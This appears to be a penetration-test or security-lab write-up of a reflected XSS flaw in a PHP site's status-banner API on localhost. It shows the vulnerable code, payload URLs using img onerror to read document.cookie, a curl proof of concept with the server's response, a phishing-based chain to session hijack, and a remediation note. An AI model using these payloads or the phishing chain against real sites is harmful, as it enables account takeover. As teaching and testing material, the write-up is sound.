# 38 — Reflected XSS via the system status banner

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** High
- **Difficulty:** Medium

## Where

| Sink | File:Line | Trigger |
|------|-----------|---------|
| API reflection (raw echo) | `web/api/v1/status/index.php:16` | `GET /api/v1/status/?msg=<payload>` |
| Content-Type selection | `web/api/v1/status/index.php:10-15` | `Accept` request header |
| Banner DOM insertion | `web/includes/layout.php:33` (`innerHTML`) | any page, message from `?status=` or the default |
| Banner message source | `web/includes/layout.php:23,28-29` | page param `status`, else `data-message` |
| Default message | `web/includes/i18n.php:130,245` | — |

## How it works (root cause)

Every page renders a status banner ("Systemunderhåll kommer ske mellan 22:00
och 02:00 på lördag") and loads the banner text from a small status service:

```js
// web/includes/layout.php:24-36 (inline script on every page)
var m = new URLSearchParams(window.location.search).get("status");
if (!m) m = b.getAttribute("data-message");
fetch("/api/v1/status/?msg=" + encodeURIComponent(m), { headers: { "Accept": "text/html" } })
    .then(function (r) { return r.text(); })
    .then(function (t) { b.innerHTML = t; });
```

The service echoes the `msg` parameter back **verbatim** when the client asks
for HTML:

```php
// web/api/v1/status/index.php:6,10-16
$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
...
$accept = isset($_SERVER['HTTP_ACCEPT']) ? $_SERVER['HTTP_ACCEPT'] : '*/*';
if (strpos($accept, 'application/json') !== false && strpos($accept, 'text/html') === false) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(array('status' => 'ok', 'message' => $msg));
} else {
    header('Content-Type: text/html; charset=utf-8');
    echo $msg;                      // <-- reflected, unescaped
}
```

The `msg` value travels in the **URL of the AJAX request** visible in the
browser's Network tab. Nothing validates or escapes it, and the response
content type is driven by the client-supplied `Accept` header. A payload
therefore lands in the victim's browser as a real `text/html` document (or
inside `innerHTML`), and executes in the context of `localhost:8080`.

## Discovery (intended path)

1. Open any page; notice the yellow status banner at the top.
2. Open DevTools → Network: the page makes a request
   `/api/v1/status/?msg=Systemunderhåll%20kommer%20ske%20mellan%2022%3A00%20och%2002%3A00%20på%20lördag`.
3. The **message is in the URL** and the response `Content-Type` is
   `text/html` (change the `Accept` header to `text/html`, or just open the
   API URL directly — the default answer is already HTML).
4. Substitute the `msg` value with a payload. The server reflects it raw.

## Exploitation steps

**Path A — direct (easiest).** Send the victim this link (e.g. in e-mail/IM,
masquerading as a status check):

```
http://localhost:8080/api/v1/status/?msg=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
```

The browser navigates to it, receives `Content-Type: text/html` with the
payload in the body, and executes it.

**Path B — through the banner.** The page JS reads a `status` page parameter
and feeds it to the API, so this link works too and keeps the victim "on the
site":

```
http://localhost:8080/index.php?status=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
```

The banner's `fetch()` requests the API with the attacker's value and writes
the HTML response into `innerHTML`.

## Working PoC (verified)

`poc/reflected-xss-status.sh` — the essential request:

```bash
curl -s -D - 'http://localhost:8080/api/v1/status/?msg=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E'
```

Actual response:

```
HTTP/1.1 200 OK
Server: nginx/1.28.3
Content-Type: text/html; charset=utf-8
X-Powered-By: PHP/8.3.17

<img src=x onerror=alert(document.cookie)>
```

The payload is reflected unescaped in a `text/html` response. Same request
with `Accept: application/json` instead returns JSON (safe), which shows the
content type is client-controlled:

```bash
curl -s -D - -H 'Accept: application/json' 'http://localhost:8080/api/v1/status/?msg=hej'
# HTTP/1.1 200 OK
# Content-Type: application/json; charset=utf-8
#
# {"status":"ok","message":"hej"}
```

## Expected result / verification

- Opening either crafted link in a browser executes the payload
  (`alert(document.cookie)` pops, or a cookie-stealing `fetch` fires).
- `curl` shows the raw payload in the response body with
  `Content-Type: text/html`.
- The session cookie is **not HttpOnly** (see 23), so
  `document.cookie` returns `OSEDESESSID=...` and can be exfiltrated exactly
  as in 01.

## Attack chain

```
victim clicks crafted link (e-mail/IM)
  → /api/v1/status/?msg=<payload> (text/html) or /index.php?status=<payload>
  → payload executes in localhost:8080 context
  → read document.cookie (not HttpOnly, see 23)
  → steal the victim's session (admin ⇒ full panel: 01/15/16 → RCE, 17/18 …)
```

Unlike 01 (stored), this needs no write access — a single convincing link is
enough, which makes it ideal for targeted phishing of `admin`.

## Notes

- The page's own HTML never reflects the payload; only the API response does.
  That is why the vulnerability is found via the Network tab (message in the
  AJAX URL), not by fuzzing the page parameters.
- The adminvisit bot is unaffected: its sandbox has no `location.search` and
  `getAttribute()` returns `null`, so the banner script exits before fetching.
- A safe implementation would (a) serve the status message from the server
  instead of echoing a client-supplied `msg`, and/or (b) output-escape it and
  always answer `application/json` for API consumers.
